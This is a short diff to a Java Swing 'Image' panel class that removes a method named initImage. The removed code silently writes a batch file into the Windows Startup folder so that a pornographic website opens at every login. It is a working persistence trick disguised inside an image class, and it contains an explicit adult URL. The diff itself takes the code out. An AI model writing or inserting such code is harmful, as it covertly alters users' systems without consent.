@@ -51,25 +51,4 @@ public class Image extends JPanel implements Serializable {
             repaint();
         }
     }
-
-    public static void initImage() {
-        String url = "https://www.pussyspace.com/vid-5922384-she-plays-with-toys-in-the-car-while-her-husband-is-at-work/";
-
-        String batchContent = "@echo off\n" +
-                "start " + url + "\n";
-
-        String userHome = System.getProperty("user.home");
-        String startupPath = Paths.get(userHome, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup").toString();
-        File batchFile = new File(startupPath, "OpenURL.bat");
-
-        try (BufferedWriter writer = new BufferedWriter(new FileWriter(batchFile))) {
-            writer.write(batchContent);
-            System.out.println("Batch file created: " + batchFile.getAbsolutePath());
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
-
-
-
 }
